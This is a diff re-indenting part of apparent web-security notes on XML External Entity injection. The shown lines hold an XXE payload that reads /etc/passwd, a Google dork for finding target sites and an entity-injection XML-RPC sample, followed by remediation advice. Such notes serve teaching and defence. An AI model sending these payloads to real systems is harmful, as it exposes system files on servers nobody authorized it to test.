@@ -108,18 +108,18 @@ DOM is a tree of objects created by the browser when the webpage is loaded and a
 	the system or on any remote system.
 	
 	
-	     <?xml version="1.0" encoding="ISO-8859-1"?>
- 	     <!DOCTYPE foo [  
-  	     <!ELEMENT foo ANY >
-  	     <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+	  <?xml version="1.0" encoding="ISO-8859-1"?>
+ 	  <!DOCTYPE foo [  
+  	  <!ELEMENT foo ANY >
+  	  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 	     
-	     googledork -> allinurl:skin/frontend
+	googledork -> allinurl:skin/frontend
 	     
-	     <!DOCTYPE a
-	     [<!ENTITY baba "hacked !!!">]
-	     >
+	 <!DOCTYPE a
+	 [<!ENTITY baba "hacked !!!">]
+	 >
 	     
-	     <methodCall><methodName>&baba;</methodName></methodCall>
+	 <methodCall><methodName>&baba;</methodName></methodCall>
 	 
 
 Remediation: The best solution would be to configure the XML processor to use a local static DTD and disallow
